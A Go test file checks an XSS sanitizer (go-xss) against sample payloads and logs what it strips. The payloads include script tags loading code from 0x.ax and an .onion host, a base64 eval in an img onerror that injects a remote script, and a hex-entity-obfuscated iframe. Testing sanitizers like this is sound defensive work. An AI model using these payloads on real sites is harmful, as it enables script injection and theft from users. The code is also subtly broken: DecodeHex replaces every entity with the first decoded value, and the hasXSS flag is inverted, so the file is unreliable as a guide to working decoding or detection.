/*
 * @author Crabin
 */

package test

import (
	"encoding/hex"
	"github.com/feiin/go-xss"
	"github.com/sergi/go-diff/diffmatchpatch"
	"log"
	"net/url"
	"regexp"
	"strconv"
	"testing"
)

var (
	XSSAttacks = []string{
		"asdfas<ScRipT sRC=//0x.ax/GtXW></ScRipT>dfasdfasdf <ScRipT sRc=//7ix7kigpovxdbtd32fuspgffmtmufo3wwzgnzaltddewtbb4mnek5byd.onion/GtXW></SCriPt>sadfsadfsadf sadfasdfasdf",
		"asdfasdf asdfasd<img src=x onerror=eval(atob('cz1jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTtib2R5LmFwcGVuZENoaWxkKHMpO3Muc3JjPSdodHRwczovLzB4LmF4L0d0WFc/JytNYXRoLnJhbmRvbSgp'))>asdfasdf asdf",
		"<iframe WIDTH=0 HEIGHT=0 srcdoc=。。。。。。。。。。&#x3C;&#x73;&#x43;&#x52;&#x69;&#x50;&#x74;&#x20;&#x73;&#x52;&#x43;&#x3D;&#x22;&#x68;&#x74;&#x74;&#x70;&#x73;&#x3A;&#x2F;&#x2F;&#x30;&#x78;&#x2E;&#x61;&#x78;&#x2F;&#x47;&#x74;&#x58;&#x57;&#x22;&#x3E;&#x3C;&#x2F;&#x73;&#x43;&#x72;&#x49;&#x70;&#x54;&#x3E;>",
		"<sCRiPt/SrC=//0x.ax/GtXW>",
	}
)

func TestXSSValidator(t *testing.T) {

	for i, XSSAttack := range XSSAttacks {
		source := XSSAttack
		source = DecodeHex(source)
		// 多次解码字符串
		source, _ = DecodeMultilayer(source)

		//fmt.Println(source)

		options := xss.XssOption{}

		// 只允许a标签，该标签只允许href, title, target这三个属性
		options.WhiteList = map[string][]string{}

		//去掉不在白名单上的标签
		options.StripIgnoreTag = true

		//仅去掉指定的不在白名单上的标签及标签体 ；“”(空数组) 去掉所有不在白名单上的标签
		options.StripIgnoreTagBody = []string{"script"}

		x := xss.NewXSS(options)
		safeHtml := x.Process(source)

		//log.Println("前：" + source)
		//log.Println("后：" + safeHtml)

		dmp := diffmatchpatch.New()

		diffs := dmp.DiffMain(source, safeHtml, false)

		// 储存疑似xss语句
		xssSentences := []string{}
		for _, diff := range diffs {
			if diff.Type != diffmatchpatch.DiffEqual {
				log.Println(diff.Text)
				xssSentences = append(xssSentences, diff.Text)
			}
		}

		hasXSS := safeHtml == source
		log.Println(hasXSS)
		log.Println("一共有" + strconv.Itoa(len(xssSentences)))
		log.Println(strconv.Itoa(i) + "===================")
	}

}

// 多次解码字符串
func DecodeMultilayer(encoded string) (string, error) {
	for {
		decoded, err := url.QueryUnescape(encoded)
		if err != nil {
			return "", err
		}
		if decoded == encoded {
			break
		}
		encoded = decoded
	}
	return encoded, nil
}

// 这个函数使用正则表达式找到输入字符串中的所有16进制编码，并使用hex.DecodeString将其解码为原始字节。然后替换原始字符串中的编码为解码后的字符串。最后返回解码后的字符串。
func DecodeHex(input string) string {
	// 匹配 &#xHH; 格式的16进制编码
	re := regexp.MustCompile(`&#x([0-9A-Fa-f]+);`)
	// 通过正则表达式找到所有的16进制编码
	hexStrings := re.FindAllStringSubmatch(input, -1)
	for _, hexStr := range hexStrings {
		// 使用hex.DecodeString解码16进制字符串
		decoded, err := hex.DecodeString(hexStr[1])
		if err == nil {
			// 替换原来的编码为解码后的字符串
			input = re.ReplaceAllString(input, string(decoded))
		}
	}
	return input
}
